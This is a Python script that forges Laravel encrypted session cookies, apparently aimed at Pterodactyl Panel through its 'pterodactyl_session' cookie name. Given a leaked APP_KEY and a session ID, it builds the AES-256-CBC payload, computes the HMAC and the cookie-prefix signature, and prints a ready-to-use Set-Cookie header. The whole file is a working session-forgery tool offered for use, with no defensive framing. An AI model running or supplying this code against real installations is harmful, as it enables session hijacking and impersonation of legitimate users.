import os
import json
import base64
import hmac
import hashlib
from Crypto.Cipher import AES

def pad(data: bytes, block_size: int = AES.block_size) -> bytes:
    """
    PKCS7 padding: pads `data` up to a multiple of block_size.
    """
    pad_len = block_size - (len(data) % block_size)
    return data + bytes([pad_len]) * pad_len

def forge_laravel_session(session_id: str, key_b64: str) -> str:
    """
    Forge a Laravel-style encrypted session cookie, matching your decrypt logic.
    """
    # 1) Decode APP_KEY
    key = base64.b64decode(key_b64)
    if len(key) != 32:
        raise ValueError("APP_KEY must decode to 32 bytes for AES-256.")

    # 2) Random IV + raw ciphertext
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(session_id.encode("utf-8")))

    # 3) Build the base64 strings exactly as in the payload
    iv_b64    = base64.b64encode(iv).decode("utf-8")
    value_b64 = base64.b64encode(ciphertext).decode("utf-8")

    # 4) MAC = HMAC‑SHA256(key, iv_b64 || value_b64)
    mac_data = iv_b64.encode("utf-8") + value_b64.encode("utf-8")
    mac = hmac.new(key, mac_data, hashlib.sha256).hexdigest()

    # 5) Package & base64‑encode the JSON
    payload = {
        "iv":    iv_b64,
        "value": value_b64,
        "mac":   mac
    }
    json_payload = json.dumps(payload, separators=(",", ":"))
    return base64.b64encode(json_payload.encode("utf-8")).decode("utf-8")
def prefix_for_laravel_cookie(cookie_name: str, key_b64: str) -> str:
    key = base64.b64decode(key_b64)
    # exactly CookieValuePrefix::create
    sig = hmac.new(key, (cookie_name + 'v2').encode(), hashlib.sha1).hexdigest()
    return sig
if __name__ == "__main__":
    # ——— CONFIGURE THESE ———
    real_session_id = "xxxx"
    key_b64    = "xxxxxx"
        # ————————————————
    hashed = prefix_for_laravel_cookie("pterodactyl_session", key_b64)
    print(f"Session ID: {real_session_id}")
    print(f"Hashed ID: {hashed}")
    full_payload = f"{hashed}|{real_session_id}"
    
    cookie_value = forge_laravel_session(full_payload, key_b64)
    print("Set-Cookie: laravel_session=" + cookie_value + "; Path=/; HttpOnly; Secure")
